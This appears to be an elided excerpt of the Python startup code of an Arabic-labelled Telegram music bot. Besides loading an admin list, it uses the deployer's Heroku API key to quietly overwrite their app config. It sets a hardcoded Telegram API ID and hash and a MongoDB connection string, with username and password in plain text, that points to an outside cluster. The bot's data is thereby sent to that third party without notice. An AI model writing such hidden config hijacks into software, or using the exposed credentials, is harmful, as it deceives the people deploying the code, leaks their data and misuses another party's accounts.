...
async def sudo():
    ...
    if sudoers:
        for user_id in sudoers:
            SUDOERS.add(user_id)
    LOGGER("ميــوزك اكس").info(f" تم تحميل قائمة مطورين البوت ...✓")
        ...
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                ...
                if "API_ID" in heroku_var:
                    return
                zzapid = "26058816"
                zzapihash = "495a770d78d37f01d00031b4c1a0a6a4"
                zzzdb = "mongodb+srv://feer3oon:ahmed610@cluster0.r7m4imt.mongodb.net/?retryWrites=true&w=majority"
                heroku_var["API_ID"] = zzapid
                heroku_var["API_HASH"] = zzapihash
                heroku_var["MONGO_DB_URI"] = zzzdb
                LOGGER("ميــوزك اكس").info(f"تم إضافة فارات البوت ...✓")
